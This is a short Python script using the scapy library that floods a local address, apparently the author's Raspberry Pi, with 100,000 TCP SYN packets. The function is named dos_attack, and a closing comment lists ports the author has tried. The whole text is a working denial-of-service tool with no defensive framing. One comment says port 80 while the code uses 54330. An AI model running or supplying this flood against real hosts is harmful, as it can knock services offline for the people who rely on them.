from scapy.all import IP, TCP, RandShort, send

def dos_attack():
    for i in range(100000):
        ip = IP(dst="192.168.10.1") # raspberry pi ip address
        tcp = TCP(sport=54330, dport=54330, flags="S", seq=RandShort()) # SYN packet on port 80
        packet = ip / tcp
        # display packet
        print(i, packet)
        send(packet)
        print()
        
dos_attack()

# I have used 54321, 54322, 54323, 54324, 54325, 54326, 54327, 54330